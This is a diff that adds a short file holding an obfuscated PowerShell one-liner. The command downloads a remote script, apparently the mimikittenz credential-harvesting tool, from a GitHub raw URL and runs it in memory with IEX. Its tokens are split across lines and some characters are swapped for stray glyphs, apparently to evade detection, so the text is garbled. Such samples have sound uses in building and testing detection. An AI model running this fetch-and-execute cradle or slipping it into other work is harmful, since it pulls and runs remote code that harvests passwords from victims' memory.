@@ -1,0 +1,17 @@
+IEX
+(
+New-Object
+Net.WebClient
+)
+.Downlo«»dString
+(
+°•
+htt«Ÿs
+:
+//raw.githubuserconten
+t.com/putterp«»nda/mimikitt«Õnz/master/Invoke-
+mimikitt«Õnz.ps1
+°¶
+)
+;
+Invoke-mimikitt«Õnz
